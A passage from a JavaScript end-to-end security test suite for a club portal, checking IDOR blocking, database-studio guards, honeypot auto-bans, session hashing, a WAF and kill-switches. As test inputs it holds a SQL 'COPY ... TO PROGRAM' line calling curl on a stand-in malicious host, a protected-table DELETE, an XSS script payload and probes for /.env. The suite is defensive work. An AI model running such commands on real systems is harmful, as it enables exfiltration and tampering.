					throw new Error(`Path traversal (${p}) did not return 404! HTTP: ${trRes.status}`);
				}
			}
			log.ok('All Path Traversal attempts on file serving route (/api/uploads/[name]) thwarted with 404.');

			// =====================================================================
			// SCENARIO 11: Mail & Communications IDOR / BOLA Shield
			// =====================================================================
			console.log(`\n${c.bold}${c.cyan}[SCENARIO 11] Mail & Communications IDOR / BOLA Shield Verification...${c.reset}`);

			const memberAId = crypto.randomUUID();
			const memberASession = crypto.randomBytes(32).toString('hex');
			await client.query(
				`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, created_at)
				 VALUES ($1, 'Member', 'PostaA', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Bilgisayar', 2, 'rol_uye', 'aktif', $3, $4, $5)`,
				[memberAId, `member_a_${Date.now()}@orbit.local`, memberASession, Date.now() + 3600000, Date.now()]
			);

			try {
				// Member A attempts to read a foreign mail thread
				const fakeKonuId = 'konu_foreign_999999';
				const idorReadRes = await fetch(`${BASE_URL}/api/posta/${fakeKonuId}`, {
					headers: { Cookie: `kulup_session_token=${memberASession}` },
				});
				if (idorReadRes.status !== 404) {
					throw new Error(`Accessing unauthorized mail thread did not return 404! HTTP: ${idorReadRes.status}`);
				}
				log.ok('Unauthorized user access to mail thread (IDOR) blocked with 404 (existence withheld).');

				// Member A attempts to write reply to foreign mail thread
				const idorReplyRes = await fetch(`${BASE_URL}/api/posta/${fakeKonuId}`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${memberASession}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({ govde: 'Unauthorized reply injection attempt' }),
				});
				if (idorReplyRes.status !== 404) {
					throw new Error(`Unauthorized reply injection to foreign mail thread did not return 404! HTTP: ${idorReplyRes.status}`);
				}
				log.ok('Unauthorized reply injection to foreign mail thread (BOLA) blocked with 404.');

				// Member A attempts to delete / move foreign thread
				const idorPatchRes = await fetch(`${BASE_URL}/api/posta/${fakeKonuId}`, {
					method: 'PATCH',
					headers: {
						Cookie: `kulup_session_token=${memberASession}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({ action: 'cope' }),
				});
				if (idorPatchRes.status !== 404) {
					throw new Error(`Modifying foreign mail thread status did not return 404! HTTP: ${idorPatchRes.status}`);
				}
				log.ok('Foreign mail thread folder/status manipulation blocked with 404.');

				// =====================================================================
				// SCENARIO 12: Database Studio & Terminal Zero-Trust Boundaries
				// =====================================================================
				console.log(`\n${c.bold}${c.cyan}[SCENARIO 12] DB Studio & Terminal Zero-Trust Boundaries Verification...${c.reset}`);

				// 12.1 Standard member must not access DB Studio and Terminal routes
				const dbMemberRes = await fetch(`${BASE_URL}/api/database/tables`, {
					headers: { Cookie: `kulup_session_token=${memberASession}` },
				});
				if (dbMemberRes.status !== 401 && dbMemberRes.status !== 403) {
					throw new Error(`Standard member was able to access /api/database/tables! HTTP: ${dbMemberRes.status}`);
				}
				log.ok('Standard member access to DB Studio tables blocked with 403 Forbidden.');

				const termMemberRes = await fetch(`${BASE_URL}/api/terminal/session`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${memberASession}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({}),
				});
				if (termMemberRes.status !== 401 && termMemberRes.status !== 403) {
					throw new Error(`Standard member was able to open Linux terminal session! HTTP: ${termMemberRes.status}`);
				}
				log.ok('Standard member Linux PTY Terminal session opening blocked with 403 Forbidden.');

				// 12.2 DB Studio query must be rejected without 2FA x-db-token even for admin
				const noDbTokenRes = await fetch(`${BASE_URL}/api/database/query`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${uploadAdminToken}`,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({ query: 'SELECT 1' }),
				});
				if (noDbTokenRes.status !== 401) {
					throw new Error(`Database query without 2FA DB token was not blocked with 401! HTTP: ${noDbTokenRes.status}`);
				}
				log.ok('Zero-Trust DB Studio: Query rejected with 401 without 2FA verification token (x-db-token) even with admin session.');

				// Derive valid x-db-token for database studio from root secret
				const authSecret = process.env.AUTH_SECRET || testAuthSecret;
				await client.query(
					"INSERT INTO system_settings (key, value, updated_at) VALUES ('auth_secret', $1, $2) ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value",
					[authSecret, Date.now()]
				);
				const dbDerivedKey = crypto.hkdfSync('sha256', authSecret, 'kulup-portal', 'database-studio-v1', 32);
				const encodedAdminUser = Buffer.from(uploadAdminId, 'utf8').toString('base64url');
				const expiresAt = Date.now() + 30 * 60 * 1000;
				const dbPayload = `db.${encodedAdminUser}.${expiresAt}`;
				const dbSig = crypto.createHmac('sha256', dbDerivedKey).update(dbPayload).digest('base64url');
				const validDbToken = `${dbPayload}.${dbSig}`;

				// 12.3 Zero-Trust SQL rules: COPY ... PROGRAM OS primitives must be blocked even for admin
				const osPrimitiveRes = await fetch(`${BASE_URL}/api/database/query`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${uploadAdminToken}`,
						'x-db-token': validDbToken,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({ query: 'COPY users TO PROGRAM \'curl http://malicious.xyz\'' }),
				});
				if (osPrimitiveRes.status !== 403) {
					throw new Error(`Forbidden COPY ... PROGRAM SQL query was not blocked! HTTP: ${osPrimitiveRes.status}`);
				}
				log.ok('Zero-Trust DB Guard: OS primitive COPY ... PROGRAM command blocked with 403 even under admin session.');

				// 12.4 Protected tables (security_blocks, audit_logs) direct SQL mutation must be blocked
				const protectedTableRes = await fetch(`${BASE_URL}/api/database/query`, {
					method: 'POST',
					headers: {
						Cookie: `kulup_session_token=${uploadAdminToken}`,
						'x-db-token': validDbToken,
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({ query: 'DELETE FROM security_blocks WHERE id > 0' }),
				});
				if (protectedTableRes.status !== 403) {
					throw new Error(`Protected security_blocks table mutation was not blocked! HTTP: ${protectedTableRes.status}`);
				}
				log.ok('Zero-Trust DB Guard: Direct DELETE query against security_blocks was blocked with 403.');

			} finally {
				await client.query('DELETE FROM users WHERE id = $1', [memberAId]);
			}
		} finally {
			await client.query('DELETE FROM users WHERE id = $1', [uploadAdminId]);
		}

		// -----------------------------------------------------------------------
		// SCENARIO 13: AI Reconnaissance & Canary Deception Fleet Auto-Quarantine
		// -----------------------------------------------------------------------
		log.step(13, 'AI Reconnaissance & Canary Deception Fleet Auto-Quarantine');

		const randCanary = Math.floor(Math.random() * 80) + 120;
		const aiCanaryIp = `198.51.100.${randCanary}`;
		const aiWpIp = `198.51.100.${randCanary + 1}`;

		// Cleanup
		await client.query('DELETE FROM security_blocks WHERE ip IN ($1, $2)', [aiCanaryIp, aiWpIp]);

		// 13.1 AI Bot probes /.env
		const canaryProbeRes = await fetch(`${BASE_URL}/.env`, {
			headers: {
				'x-forwarded-for': aiCanaryIp,
				'User-Agent': 'Offensive-AI-Recon-Agent/1.0',
			},
		});

		if (canaryProbeRes.status !== 403) {
			throw new Error(`AI Canary probe (/.env) was not blocked with 403! HTTP: ${canaryProbeRes.status}`);
		}
		log.ok(`AI Canary Triggered: Bot request for '/.env' trapped by Edge and blocked with 403.`);

		// Wait for async DB quarantine
		await new Promise((r) => setTimeout(r, 400));

		// 13.2 Verify security_blocks quarantine record
		const canaryBanCheck = await client.query(
			`SELECT * FROM security_blocks WHERE ip = $1`,
			[aiCanaryIp]
		);
		if (canaryBanCheck.rowCount === 0) {
			throw new Error(`Canary trigger IP (${aiCanaryIp}) was not auto-quarantined!`);
		}
		const canaryBanRecord = canaryBanCheck.rows[0];
		const banStatus = canaryBanRecord.status ?? canaryBanRecord.status;
		const threatScore = Number(canaryBanRecord.threat_score ?? canaryBanRecord.tehditpuani);
		if (banStatus !== 'ban' || threatScore < 100) {
			throw new Error(`Quarantine record does not have expected threat score (>=100): ${JSON.stringify(canaryBanRecord)}`);
		}
		log.ok(`Automated Quarantine Success: ${aiCanaryIp} banned with threat score ${threatScore}.`);

		// 13.3 Verify quarantined IP cannot access legitimate endpoints
		const subsequentRes = await fetch(`${BASE_URL}/api/setup`, {
			headers: {
				'x-forwarded-for': aiCanaryIp,
			},
		});
		if (subsequentRes.status !== 403) {
			throw new Error(`Quarantined IP accessed legitimate endpoint! HTTP: ${subsequentRes.status}`);
		}
		log.ok(`Quarantine Shield Verified: Banned IP subsequently blocked on /api/setup with 403.`);

		// 13.4 Second honeypot probe (/wp-login.php)
		const wpProbeRes = await fetch(`${BASE_URL}/wp-login.php`, {
			headers: {
				'x-forwarded-for': aiWpIp,
				'User-Agent': 'Mozilla/5.0 (compatible; CTF-Bot/2.0)',
			},
		});
		if (wpProbeRes.status !== 403) {
			throw new Error(`wp-login.php decoy did not return 403! HTTP: ${wpProbeRes.status}`);
		}
		log.ok(`WordPress decoy (/wp-login.php) triggered and blocked with 403.`);

		await new Promise((r) => setTimeout(r, 400));
		const wpBanCheck = await client.query(`SELECT * FROM security_blocks WHERE ip = $1`, [aiWpIp]);
		if (wpBanCheck.rowCount === 0) {
			throw new Error(`wp-login.php decoy trigger IP (${aiWpIp}) was not auto-quarantined!`);
		}
		log.ok(`Automated Quarantine Verified: ${aiWpIp} quarantined after WordPress decoy trigger.`);

		// Cleanup
		// ==============================================================================
		// SCENARIO 14: At-Rest Token Hashing, Pass-the-Cookie Shield & JSON Body WAF
		// ==============================================================================
		console.log(`\n${c.bold}${c.cyan}==> [SECURITY TEST 14/8] At-Rest Token Hashing, Pass-the-Cookie Shield & JSON Body WAF${c.reset}`);

		// 14.1 Create test user and verify session token is stored as SHA-256 hash
		const test14UserId = crypto.randomUUID();
		const test14SessionToken = crypto.randomBytes(32).toString('hex');
		const test14TokenHash = crypto.createHash('sha256').update(test14SessionToken).digest('hex');
		const initialIp = '198.51.100.10';
		const session14Expiry = Date.now() + 24 * 3600 * 1000;

		try {
			await client.query(
				`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, last_login_ip, created_at)
				 VALUES ($1, 'Security', 'Admin14', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber Savunma', 4, 'rol_admin', 'aktif', $3, $4, $5, $6)`,
				[test14UserId, `sec14_${Date.now()}@orbit.local`, test14TokenHash, session14Expiry, initialIp, Date.now()]
			);

			const userTokenCheck = await client.query(
				`SELECT session_token FROM users WHERE id = $1`,
				[test14UserId]
			);
			const dbToken = userTokenCheck.rows[0]?.session_token;
			if (!dbToken || !/^[a-f0-9]{64}$/.test(dbToken)) {
				throw new Error(`Session token not stored as 64-character SHA-256 hash in database! Token: ${dbToken}`);
			}
			log.ok(`At-Rest Hashing Verified: Session token stored as SHA-256 hash (${dbToken.slice(0, 16)}...) in database.`);

			// 14.2 Authentication test from legitimate IP
			const legitRes = await fetch(`${BASE_URL}/api/auth/me`, {
				headers: {
					Cookie: `kulup_session_token=${test14SessionToken}`,
					'CF-Connecting-IP': initialIp,
				},
			});
			if (legitRes.status !== 200) {
				throw new Error(`Session verification failed from legitimate IP! HTTP: ${legitRes.status}`);
			}
			log.ok(`Session Verified: SHA-256 hashed token transparently and successfully resolved (HTTP 200).`);

			// 14.3 JSON Body WAF Protection
			const wafBodyRes = await fetch(`${BASE_URL}/api/notlar`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					Cookie: `kulup_session_token=${test14SessionToken}`,
					'CF-Connecting-IP': initialIp,
				},
				body: JSON.stringify({
					baslik: 'Siber Not',
					icerik: '<script>alert("XSS in JSON")</script>',
				}),
			});
			if (wafBodyRes.status !== 403) {
				throw new Error(`XSS payload in JSON body was not blocked by WAF! HTTP: ${wafBodyRes.status}`);
			}
			log.ok(`JSON Body WAF Verified: Malicious script in POST /api/notlar body repelled with 403 Forbidden.`);

			// 14.4 Pass-the-Cookie attack attempt from different subnet / IP jump
			const stolenCookieIp = '203.0.113.88';
			const hijackAttemptRes = await fetch(`${BASE_URL}/api/auth/me`, {
				headers: {
					Cookie: `kulup_session_token=${test14SessionToken}`,
					'CF-Connecting-IP': stolenCookieIp,
				},
			});
			if (hijackAttemptRes.status !== 401) {
				throw new Error(`Pass-the-Cookie attack (different IP jump) was not blocked! HTTP: ${hijackAttemptRes.status}`);
			}
			const hijackBody = await hijackAttemptRes.json().catch(() => ({}));
			if (hijackBody.code !== 'SESSION_IP_MISMATCH') {
				throw new Error(`Expected SESSION_IP_MISMATCH code not returned: ${JSON.stringify(hijackBody)}`);
			}
			log.ok(`Pass-the-Cookie Shield Successful: Stolen cookie from different IP (${stolenCookieIp}) instantly frozen with 401 SESSION_IP_MISMATCH.`);
		} finally {
			await client.query('DELETE FROM users WHERE id = $1', [test14UserId]).catch(() => {});
		}

		// SCENARIO 15: Docker Ingress Protection, Threat Intelligence & Emergency Kill-Switches
		log.step(15, 'Docker Ingress Protection, Threat Intelligence & Emergency Kill-Switches');

		const s15AdminId = crypto.randomUUID();
		const s15AdminToken = crypto.randomBytes(32).toString('hex');
		await client.query(
			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at, last_login_ip)
			 VALUES ($1, 'Admin', 'KillSwitch', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber', 4, 'rol_admin', 'aktif', $3, $4, 1, $5, '127.0.0.1')`,
			[s15AdminId, `e2e_killswitch_admin_${Date.now()}@orbit.local`, s15AdminToken, Date.now() + 86400000, Date.now()]
		);

		try {
			// 15.1 Emergency Kill-Switch: disableRegistrations via /api/soc
			const toggleRegRes = await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					Cookie: `kulup_session_token=${s15AdminToken}`,
				},
				body: JSON.stringify({
					action: 'toggle_kill_switch',
					key: 'disableRegistrations',
					value: true,
				}),
			});
			if (!toggleRegRes.ok) {
				throw new Error(`Kill-switch toggle_kill_switch failed! HTTP: ${toggleRegRes.status}`);
			}
			await new Promise((r) => setTimeout(r, 600));

			const regRes = await fetch(`${BASE_URL}/api/auth/register`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					ad: 'Test',
					soyad: 'KillSwitch',
					email: 'killswitch_test@orbit.local',
					password: 'Pass1234!',
				}),
			});
			if (regRes.status !== 503) {
				throw new Error(`Registration did not return 503 while disableRegistrations is active! HTTP: ${regRes.status}`);
			}
			log.ok(`Kill-Switch (disableRegistrations) Verified: New member registration immediately halted with HTTP 503.`);

			// 15.2 Emergency Kill-Switch: disableUploads
			const toggleUploadRes = await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					Cookie: `kulup_session_token=${s15AdminToken}`,
				},
				body: JSON.stringify({
					action: 'toggle_kill_switch',
					key: 'disableUploads',
					value: true,
				}),
			});
			if (!toggleUploadRes.ok) {
				const errBody = await toggleUploadRes.json().catch(() => ({}));
				throw new Error(`Kill-switch toggle_kill_switch (disableUploads) failed! HTTP: ${toggleUploadRes.status}: ${JSON.stringify(errBody)}`);
			}
			await new Promise((r) => setTimeout(r, 600));

			const uploadRes = await fetch(`${BASE_URL}/api/upload`, {
				method: 'POST',
			});
			if (uploadRes.status !== 503) {
				throw new Error(`Uploads did not return 503 while disableUploads is active! HTTP: ${uploadRes.status}`);
			}
			log.ok(`Kill-Switch (disableUploads) Verified: File uploads suspended with HTTP 503.`);

			// 15.3 Emergency Kill-Switch: passkeyOnly
			await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					Cookie: `kulup_session_token=${s15AdminToken}`,
				},
				body: JSON.stringify({
					action: 'toggle_kill_switch',
					key: 'passkeyOnly',
					value: true,
				}),
			});
			await new Promise((r) => setTimeout(r, 600));

			const passkeyOnlyRes = await fetch(`${BASE_URL}/api/auth/login`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					email: 'admin@orbit.local',
					password: 'SomePassword123!',
				}),
			});
			if (passkeyOnlyRes.status !== 403) {
				throw new Error(`Password login was not blocked with 403 while passkeyOnly is active! HTTP: ${passkeyOnlyRes.status}`);
			}
			log.ok(`Kill-Switch (passkeyOnly) Verified: Password logins rejected (HTTP 403 Passkey required).`);

			// 15.4 SSE Stream unauthenticated access check
			const sseUnauthorizedRes = await fetch(`${BASE_URL}/api/soc/stream`);
			if (sseUnauthorizedRes.status !== 401 && sseUnauthorizedRes.status !== 403) {
				throw new Error(`Unauthenticated /api/soc/stream call did not receive 401/403! HTTP: ${sseUnauthorizedRes.status}`);
			}
			log.ok(`SIEM Live Tail SSE Protection Verified: Unauthenticated stream request rejected with ${sseUnauthorizedRes.status}.`);

			// 15.5 Email Webhook / Security Alert Test
			const emailAlertTestRes = await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					Cookie: `kulup_session_token=${s15AdminToken}`,
				},
				body: JSON.stringify({
					action: 'test_webhook',
					config: {
						enabled: true,
						provider: 'email',
						emailRecipients: 'security-test@orbit.local',
						notifyOn: { lockdown: true, autoban: true, honeypot: true, fim: true, loginAnomalies: false },
					},
				}),
			});
			const emailAlertJson = await emailAlertTestRes.json();
			if (!emailAlertTestRes.ok || !emailAlertJson.sent) {
				throw new Error(`Email security alert test failed! Response: ${JSON.stringify(emailAlertJson)}`);
			}
			log.ok(`Email Webhook / Security Alert Verified: SMTP security notification triggered successfully.`);
		} finally {
			// Reset kill-switches (return to normal operation)
			await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					Cookie: `kulup_session_token=${s15AdminToken}`,
				},
				body: JSON.stringify({ action: 'toggle_kill_switch', key: 'disableRegistrations', value: false }),
			}).catch(() => {});
			await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					Cookie: `kulup_session_token=${s15AdminToken}`,
				},
				body: JSON.stringify({ action: 'toggle_kill_switch', key: 'disableUploads', value: false }),
			}).catch(() => {});
			await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					Cookie: `kulup_session_token=${s15AdminToken}`,
				},
				body: JSON.stringify({ action: 'toggle_kill_switch', key: 'passkeyOnly', value: false }),
			}).catch(() => {});
			await client.query(
				`UPDATE system_settings SET value = '{"disableRegistrations":false,"disableUploads":false,"passkeyOnly":false}' WHERE key = 'soc_emergency_switches'`
			).catch(() => {});
			await client.query('DELETE FROM users WHERE id = $1', [s15AdminId]).catch(() => {});
			await client.query("DELETE FROM security_blocks WHERE ip LIKE '%127.0.0.1%' OR ip = '::1' OR ip = 'localhost'").catch(() => {});
			// Wait for worker cache expiration
			await new Promise((r) => setTimeout(r, 600));
		}

		// =====================================================================
		// SCENARIO 16: Enterprise SIEM Pagination, Threat Histogram & DEFCON Reset
		// =====================================================================
		console.log(`\n${c.bold}${c.cyan}==> [SECURITY TEST 16/8] Enterprise SIEM Pagination, Threat Histogram & DEFCON Reset${c.reset}`);
		const s16AdminId = crypto.randomUUID();
		const s16AdminToken = crypto.randomBytes(32).toString('hex');
		await client.query(
			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at, last_login_ip)
			 VALUES ($1, 'SIEM', 'Admin', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber', 4, 'rol_admin', 'aktif', $3, $4, 1, $5, '127.0.0.1')`,
			[s16AdminId, `e2e_siem_admin_${Date.now()}@orbit.local`, s16AdminToken, Date.now() + 86400000, Date.now()]
		);

		try {
			// 16.1 Paginated SIEM Query & Histogram Verification
			const siemPageRes = await fetch(`${BASE_URL}/api/soc?action=siem&timeRange=24h&page=1&limit=25`, {
				headers: { Cookie: `kulup_session_token=${s16AdminToken}` },
			});
			if (!siemPageRes.ok) {
				throw new Error(`Paginated SIEM query failed! HTTP: ${siemPageRes.status}`);
			}
			const siemPageJson = await siemPageRes.json();
			if (!Array.isArray(siemPageJson.siem) || typeof siemPageJson.totalCount !== 'number' || typeof siemPageJson.totalPages !== 'number') {
				throw new Error(`SIEM paginated response format invalid! ${JSON.stringify(siemPageJson)}`);
			}
			if (siemPageJson.siem.length > 25) {
				throw new Error(`SIEM limit=25 exceeded: ${siemPageJson.siem.length}`);
			}
			if (!Array.isArray(siemPageJson.histogram) || siemPageJson.histogram.length === 0) {
				throw new Error(`SIEM histogram returned empty!`);
			}
			const sampleBucket = siemPageJson.histogram[0];
			if (typeof sampleBucket.bucket !== 'number' || typeof sampleBucket.start !== 'number' || typeof sampleBucket.end !== 'number' || typeof sampleBucket.count !== 'number') {
				throw new Error(`Histogram bucket format invalid: ${JSON.stringify(sampleBucket)}`);
			}
			log.ok(`Paginated SIEM API and 24-Hour Threat Histogram verified successfully (${siemPageJson.totalCount} total logs, ${siemPageJson.histogram.length} buckets).`);

			// 16.2 Time Window Filter (Last 15 Minutes)
			const siem15mRes = await fetch(`${BASE_URL}/api/soc?action=siem&timeRange=15m&page=1&limit=50`, {
				headers: { Cookie: `kulup_session_token=${s16AdminToken}` },
			});
			const siem15mJson = await siem15mRes.json();
			if (siem15mRes.ok && Array.isArray(siem15mJson.siem)) {
				const now = Date.now();
				const fifteenMinsAgo = now - 15 * 60 * 1000 - 5000;
				for (const item of siem15mJson.siem) {
					if (item.zaman < fifteenMinsAgo) {
						throw new Error(`Legacy log returned outside 15-minute time window: ${item.zaman} < ${fifteenMinsAgo}`);
					}
				}
				log.ok(`Time window filter (Last 15 Minutes) verified: Only recent logs returned.`);
			}

			// 16.3 DEFCON Baseline Reset (Acknowledge Alarms & Set DEFCON 5)
			const resetDefconRes = await fetch(`${BASE_URL}/api/soc`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					Cookie: `kulup_session_token=${s16AdminToken}`,
				},
				body: JSON.stringify({ action: 'reset_defcon' }),
			});
			if (!resetDefconRes.ok) {
				throw new Error(`DEFCON reset failed! HTTP: ${resetDefconRes.status}`);
			}
			const resetDefconJson = await resetDefconRes.json();
			if (!resetDefconJson.ok || resetDefconJson.defcon !== 5) {
				throw new Error(`DEFCON reset did not return 5! ${JSON.stringify(resetDefconJson)}`);
			}
			log.ok(`DEFCON Alarm Reset (reset_defcon) verified: Cyber defense shield successfully returned to DEFCON 5 (Peace Mode).`);

			// 16.4 Overview DEFCON Verification
			const overviewRes = await fetch(`${BASE_URL}/api/soc?action=all`, {
				headers: { Cookie: `kulup_session_token=${s16AdminToken}` },
			});
			const overviewJson = await overviewRes.json();
			const activeDefcon = overviewJson.overview?.defcon;
			if (!overviewRes.ok || activeDefcon !== 5) {
				throw new Error(`Overview did not return DEFCON as 5: ${activeDefcon}`);
			}
			log.ok(`SoC Radar Overview DEFCON verification: DEFCON ${activeDefcon} (Peace State) confirmed.`);
		} finally {
			await client.query('DELETE FROM users WHERE id = $1', [s16AdminId]).catch(() => {});
		}

		const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
		console.log(`\n${c.bold}${c.green}================================================================${c.reset}`);
		console.log(`${c.bold}${c.green}  ALL CYBERSECURITY AND SOC TESTS PASSED SUCCESSFULLY! (${elapsed}s) ${c.reset}`);
		console.log(`${c.bold}${c.green}================================================================${c.reset}\n`);

	} catch (err) {
		log.error(`Security test failed: ${err.message}`);
		console.error(err);
		// Failsafe to restore lockdown mode in case of unhandled error
		try {
			await client.query(
				`UPDATE system_settings SET value = '0' WHERE key = 'soc_lockdown_mode'`
			);
		} catch {}
		process.exit(1);
	} finally {
		if (spawnedServer && spawnedServer.pid) {
			try {
				process.kill(-spawnedServer.pid, 'SIGTERM');
			} catch {}
		}
		if (client) {
			await client.query("DELETE FROM security_blocks WHERE ip LIKE '%127.0.0.1%' OR ip = '::1' OR ip = 'localhost'").catch(() => {});
			await client.query("UPDATE system_settings SET value = '{\"disableRegistrations\":false,\"disableUploads\":false,\"passkeyOnly\":false}' WHERE key = 'soc_emergency_switches'").catch(() => {});
			client.release();
		}
		await pool.end();
	}
}

run();
